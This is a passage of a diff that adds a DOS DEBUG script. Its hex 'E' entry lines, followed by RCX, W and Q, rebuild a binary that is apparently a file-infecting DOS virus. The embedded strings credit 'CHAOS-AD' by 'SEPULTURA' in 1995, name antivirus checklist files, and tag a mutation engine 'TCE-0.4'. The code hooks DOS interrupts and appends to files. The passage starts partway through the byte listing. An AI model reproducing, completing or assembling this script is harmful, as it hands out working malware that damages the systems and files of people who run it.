+E  4f0  00 B9 00 02 F7 F1 40 A3 B5 07 89 16 B3 07 E8 D9
+
+E  500  00 BA B1 07 B9 1C 00 E8 BF 00 E8 B4 00 E8 DD 00
+
+E  510  C3 58 0E E8 23 FD 9C 60 1E 06 72 51 E8 60 01 72
+
+E  520  4C B0 2F E8 A8 00 06 1F 89 DF 8D 55 1E 80 7D 1B
+
+E  530  AD 75 3A E8 FB 00 E8 83 00 72 2F 1E 07 0E 1F 93
+
+E  540  B9 FF FF BA FA FF B8 42 02 E8 82 00 BA C3 07 B9
+
+E  550  06 00 E8 77 00 72 13 E8 6C 00 81 3E C3 07 05 CA
+
+E  560  75 08 BE C5 07 83 C7 1A A5 A5 E8 80 00 07 1F 61
+
+E  570  9D CA 02 00 B0 03 CF 0E 1F B8 2A 35 CD 21 89 9C
+
+E  580  B8 04 8C 84 BA 04 06 53 B4 25 50 8D 94 97 04 CD
+
+E  590  21 58 5A 1F CD 21 C3 9C 60 06 89 E5 E8 00 00 5E
+
+E  5a0  C4 7E 14 FD B0 FA AE 75 FD 47 2E 89 BC 33 00 2E
+
+E  5b0  8C 84 35 00 07 61 9D EA 00 00 00 00 B8 3D 00 EB
+
+E  5c0  0D 26 80 4D 06 40 B0 3E A9 B0 40 A9 B0 3F 86 C4
+
+E  5d0  9C 9A 00 00 00 00 C3 B4 02 A9 B4 00 B0 42 33 C9
+
+E  5e0  99 EB EB C1 E3 02 6A 00 07 26 C4 1F C3 53 E8 C8
+
+E  5f0  00 5B BF 24 00 B8 00 00 BA 00 00 FC C1 E7 02 06
+
+E  600  6A 00 07 AB 92 AB 07 C3 53 B8 DF ED F7 D0 CD 2F
+
+E  610  26 8A 1D B8 E9 ED F7 D0 CD 2F 5B C3 26 83 65 02
+
+E  620  FE 26 83 4D 02 02 C3 B9 08 00 6A 00 E2 FC 61 9E
+
+E  630  C3 60 1E 06 0E 1F BB 24 00 89 DF E8 A5 FF 89 1E
+
+E  640  F6 04 8C 06 F9 04 8C CA B8 74 04 E8 AD FF E8 65
+
+E  650  00 BF 27 00 8D 95 42 07 B8 43 01 33 C9 E8 6E FF
+
+E  660  B0 41 E8 69 FF 83 EF 0D 75 EA 07 1F 61 C3 53 B0
+
+E  670  62 E8 5A FF 4B 8E C3 BF 08 00 26 8B 05 5B C3 60
+
+E  680  1E 06 E8 E9 FF 0E 07 BF 86 07 B9 0E 00 FC F2 AF
+
+E  690  74 1A EB 13 60 1E 06 E8 D4 FF 0E 07 BF 92 07 B9
+
+E  6a0  08 00 FC F2 AF 74 05 07 1F 61 F8 C3 07 1F 61 F9
+
+E  6b0  C3 AC AA E2 FC C3 32 DB A9 B3 00 60 B8 02 FA BA
+
+E  6c0  45 59 CD 16 2E 88 0E BA 05 61 C3 60 1E 06 BB 2F
+
+E  6d0  00 89 DF E8 0D FF 89 1E 24 06 8C 06 26 06 8C DA
+
+E  6e0  B8 19 06 E8 15 FF 8C DA BB 09 00 89 DF E8 F3 FE
+
+E  6f0  89 1E 15 06 8C 06 17 06 C6 06 A5 07 00 B8 07 06
+
+E  700  E8 F8 FE 07 1F 61 C3 9C FA 2E FE 06 A5 07 75 03
+
+E  710  E8 15 00 9D EA 00 00 00 00 9C 3D 05 16 75 03 E8
+
+E  720  06 00 9D EA 00 00 00 00 FC 60 1E 06 0E 1F B8 03
+
+E  730  00 CD 10 BA 0C 08 E8 3E 00 BE 7E 06 E8 2D 00 BA
+
+E  740  0C 09 E8 32 00 BE B5 06 E8 21 00 BD 28 00 BE EC
+
+E  750  06 BA 23 0B E8 20 00 E8 12 00 81 FE 4F 07 73 EE
+
+E  760  4D 75 EE B8 03 00 CD 10 07 1F 61 C3 AC B4 0E CD
+
+E  770  10 3C 07 76 F6 EB F5 B4 02 B7 00 CD 10 C3 2D 20
+
+E  780  5B 43 48 41 4F 53 2D 41 44 5D 20 2D 20 43 4F 44
+
+E  790  45 44 20 42 59 20 53 45 50 55 4C 54 55 52 41 20
+
+E  7a0  2D 20 41 55 53 54 52 41 4C 49 41 20 2D 20 31 39
+
+E  7b0  39 35 20 2D 00 2D 3D 3E 20 4C 49 56 49 4E 47 2D
+
+E  7c0  49 4E 2D 41 2D 44 59 49 4E 47 2D 41 47 45 2D 50
+
+E  7d0  45 52 53 45 43 55 54 45 2D 54 48 45 2D 48 55 4D
+
+E  7e0  41 4E 2D 52 41 43 45 20 3C 3D 2D 00 52 45 46 55
+
+E  7f0  53 45 20 20 07 52 45 53 49 53 54 20 20 07 52 45
+
+E  800  4C 4F 56 45 20 20 07 52 45 4D 41 54 45 20 20 07
+
+E  810  53 55 46 46 45 52 20 20 07 52 45 48 41 54 45 20
+
+E  820  20 07 52 45 4A 45 43 54 20 20 07 50 52 4F 47 52
+
+E  830  45 53 53 07 50 52 4F 43 45 53 53 20 07 50 52 4F
+
+E  840  54 45 53 54 20 07 4E 4F 20 52 45 53 54 20 07 43
+
+E  850  48 4B 4C 49 53 54 2E 4D 53 00 00 00 43 48 4B 4C
+
+E  860  49 53 54 2E 43 50 53 00 00 41 4E 54 49 2D 56 49
+
+E  870  52 2E 44 41 54 00 43 4F 46 2D 41 56 2D 56 54 42
+
+E  880  56 49 30 30 56 42 43 48 53 43 44 45 4E 44 53 50
+
+E  890  50 52 41 52 50 4B 52 41 55 43 4C 48 5A 49 55 55
+
+E  8a0  49 56 00 00 00 00 B8 00 00 FF E0 05 CA 00 00 00
+
+E  8b0  00 CD 20 00 00 00 00 00 00 00 00 00 00 00 00 00
+
+E  8c0  00 00 00 00 00 00 00 00 00 00 00 00 00 5B 54 43
+
+E  8d0  45 2D 30 2E 34 5D 00 50 53 55 57 56 FC 89 3E 2B
+
+E  8e0  0D 89 16 29 0D 89 0E 2D 0D A3 27 0D E8 C8 04 C6
+
+E  8f0  06 22 0D 00 C6 06 F4 0A B0 F7 06 27 0D 01 00 74
+
+E  900  05 C6 06 F4 0A C3 56 E8 61 04 05 71 00 91 E8 E3
+
+E  910  02 BE F4 0C AD E8 45 04 74 05 87 04 89 44 FE 50
+
+E  920  AD E8 39 04 75 05 87 04 89 44 FE 50 AD AD E8 2C
+
+E  930  04 74 05 87 04 89 44 FE 58 FF D0 E8 AA 02 58 FF
+
+E  940  D0 E8 A4 02 FF 16 F8 0C E8 9D 02 E8 BA 00 E8 90
+
+E  950  02 FF 16 FA 0C E8 89 02 FF 16 FC 0C E8 89 02 E8
+
+E  960  70 01 E8 7C 02 F7 06 27 0D 02 00 74 11 C6 06 F4
+
+E  970  0A B0 B9 90 01 03 0E 2B 0D 29 F9 E8 76 02 8B C7
+
+E  980  2D 90 01 01 06 E3 0C 8B 1E 20 0D 80 3E 22 0D 01
+
+E  990  75 02 F7 D8 26 01 07 5E 8B 0E 2D 0D F3 A4 8B 16
+
+E  9a0  2B 0D 06 1F E8 38 04 8B CF 29 D1 5E 5F 5D 5B 58
+
+E  9b0  C3 E8 11 04 3C 02 74 F9 A2 24 0D 8B 1E 2D 0D D1
+
+E  9c0  EB 89 1E E0 0C E8 A7 01 C3 B8 FF 00 E8 A2 03 50
+
+E  9d0  E8 95 03 58 75 02 33 C0 A2 1F 0D BB 90 01 03 1E
+
+E  9e0  2B 0D 89 1E E3 0C 03 1E 29 0D 98 29 C3 E8 D5 03
+
+E  9f0  3C 03 72 F9 A3 1D 0D A2 23 0D C6 06 26 0D 01 E8
+
+E  a00  6D 01 C6 06 26 0D 00 C3 89 3E 1B 0D E8 D2 01 8A
+
+E  a10  1E 25 0D C0 E3 03 E8 4C 03 03 C0 05 0E 0D 96 AD
+
+E  a20  E8 3A 03 75 02 86 C4 50 81 FE 10 0D 75 0C B0 F8
+
+E  a30  E8 2A 03 75 01 40 A2 E8 0C AA F7 06 27 0D 04 00
+
+E  a40  74 03 B0 2E AA 58 AA 88 26 E9 0C 8B 36 1D 0D 80
+
+E  a50  3E 23 0D 05 74 17 80 3E 1F 0D 00 75 10 50 E8 07
+
+E  a60  03 58 74 09 81 C6 06 0D AC 08 D8 AA C3 81 C6 FE
+
+E  a70  0C AC 08 D8 8A 26 1F 0D 08 D8 AB 86 E0 98 E8 DC
+
+E  a80  02 75 E9 88 E0 AA 26 80 45 FD 40 C3 E8 D9 02 74
+
+E  a90  18 E8 D1 02 05 17 0D 96 AC 88 C4 B0 81 A3 EB 0C
+
+E  aa0  0A 26 25 0D AB E8 C6 02 AB A3 ED 0C C3 E8 AD 02
+
+E  ab0  74 0B A0 23 0D 0C 40 AA E8 26 01 AA C3 B0 83 AA
+
+E  ac0  B4 02 A0 23 0D 0C C0 E8 93 02 75 04 F6 DC 0C E8
+
+E  ad0  AB C3 A0 24 0D 3C 01 75 1D 50 E8 8B 02 58 74 16
+
+E  ae0  8D 5D 02 A1 1B 0D 29 D8 B4 E2 E8 70 02 75 03 95
+
+E  af0  EB 32 86 C4 AB C3 93 E8 63 02 74 07 B0 48 08 D8
+
+E  b00  AA EB 1C B0 83 AA B4 FF 8A C3 0C C0 E8 4E 02 75
+
+E  b10  04 F6 DC 0C E8 AB 33 ED 50 E8 4C 02 58 74 21 E8
+
+E  b20  C6 00 33 ED A0 24 0D 8A D8 C0 E0 03 08 D8 86 C4
+
+E  b30  8A FC E8 30 02 05 14 0D 96 AC 8A E7 80 CC C0 AB
+
+E  b40  8D 5D 02 A1 1B 0D 29 D8 0B ED 75 10 B4 75 E8 0C
+
+E  b50  02 75 0B 26 C6 05 F8 47 2D 01 FE A9 B4 E0 86 C4
+
+E  b60  AB C3 E8 09 02 A3 E6 0C 93 E8 59 02 A2 25 0D E8
+
+E  b70  EB 01 74 06 0C B8 AA 93 EB 40 E8 E0 01 74 0D C0
+
+E  b80  E0 03 0C 06 B4 8D 86 C4 AB 93 EB 2E 53 50 B4 C0
+
+E  b90  0A E0 C0 E0 03 0A E0 B0 29 E8 C1 01 75 02 B0 31
+
+E  ba0  AB E8 44 00 5B E8 BD 01 05 18 0D 96 AC E8 AD 01
+
+E  bb0  74 15 08 D8 B4 81 86 C4 AB 58 80 3E 26 0D 01 75
+
+E  bc0  04 89 3E 20 0D AB C3 80 3E 26 0D 01 75 05 C6 06
+
+E  bd0  22 0D 01 B0 E8 08 D8 B4 81 86 C4 AB 58 F7 D8 EB
+
+E  be0  D9 50 E8 83 01 40 EB 06 50 E8 7F 01 0C 08 91 E8
+
+E  bf0  02 00 58 C3 B0 03 E8 77 01 75 17 C6 06 AF 0B 83
+
+E  c00  89 C8 3D 40 00 76 02 B0 40 E8 64 01 93 E8 CC 00
+
+E  c10  EB 03 E8 9A 00 E3 DC EB DB E3 D8 BE 98 0C B0 0E
+
+E  c20  E8 4D 01 01 C6 A4 49 4B C3 E8 3C 01 C0 E0 03 0C
+
+E  c30  03 92 E8 90 01 C0 E0 03 8A F0 E8 2B 01 08 C6 80
+
+E  c40  CE C0 92 83 FB 02 72 D1 AB 49 49 4B 4B C3 E8 17
+
+E  c50  01 3C 06 74 F9 92 E8 6C 01 C0 E0 03 08 D0 B4 8D
+
+E  c60  86 C4 EB DF E8 07 01 24 08 0C 05 80 E4 03 C0 EC
+
+E  c70  04 0A C4 83 FB 03 72 B1 AA E8 F2 00 AB 83 E9 03
+
+E  c80  83 EB 03 C3 E8 3E 01 0C B8 EB E8 83 FB 04 72 D4
+
+E  c90  E8 32 01 B4 81 92 E8 CF 00 C0 E0 03 09 D0 86 C4
+
+E  ca0  80 CC C0 AB E8 C7 00 AB 83 EB 04 83 E9 04 C3 83
+
+E  cb0  F9 03 72 FA C6 06 AF 0B C3 E8 B2 00 25 0F 1F 80
+
+E  cc0  C4 04 0C 70 50 E8 A3 00 58 75 02 B0 E3 33 DB 8A
+
+E  cd0  DC 49 49 39 CB 72 04 8B D9 8A E3 AB 0B DB 74 CE
+
+E  ce0  B0 0D E8 8B 00 03 C0 05 41 0C 96 AD FF D0 EB EC
+
+E  cf0  83 FB 03 72 2C 8D 47 FE D1 E8 E8 74 00 92 E8 67
+
+E  d00  00 0C 50 AA 49 4B 50 92 29 C3 53 93 E8 CD FF 5B
+
+E  d10  58 E8 49 00 74 05 E8 AC 00 0C 50 0C 08 AA 49 4B
+
+E  d20  C3 83 FB 04 72 FA E8 3C 00 03 C0 05 A7 0C 96 AD
+
+E  d30  BA B4 CD 86 D0 AB 92 86 C4 AB 83 E9 04 83 EB 04
+
+E  d40  C3 8B 0B 8B 0B 8B 0B 21 0C 21 0C F0 0B F0 0B 29
+
+E  d50  0B 29 0B 4E 0B 4E 0B 84 0B 64 0B 19 0B 50 B0 01
+
+E  d60  E8 0D 00 58 C3 B0 02 A9 B0 07 A9 B0 1F A9 B0 FE
+
+E  d70  98 51 52 40 50 E5 40 91 E5 40 D3 C0 91 E5 40 33
+
+E  d80  C1 15 AA AA A3 82 0C 59 33 D2 83 F9 01 83 D1 00
+
+E  d90  F7 F1 92 0B C0 5A 59 C3 F5 FC FD ED EC 9F 98 90
+
+E  da0  37 3F 27 2F 40 48 D7 16 01 16 02 21 4D 21 4D 10
+
+E  db0  0D 21 0B 2A 00 2A 00 99 88 16 23 0D 88 16 25 0D
+
+E  dc0  88 16 24 0D C3 E8 A0 FF A8 FB 74 F9 3A 06 23 0D
+
+E  dd0  74 F3 3A 06 24 0D 74 ED 3A 06 25 0D 74 E7 C3 B9
+
+E  de0  00 00 BB 00 00 B8 00 00 90 31 07 00 00 00 00 43
+
+E  df0  43 E2 F5 C3 B1 08 62 0A C9 08 AD 09 8C 09 00 00
+
+E  e00  00 47 00 46 44 45 00 00 00 07 00 00 04 05 19 11
+
+E  e10  31 31 01 29 21 09 85 E8 C0 F0 C8 00 00 00 00 00
+
+E  e20  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+
+RCX
+
+d2f
+
+W
+
+Q
+
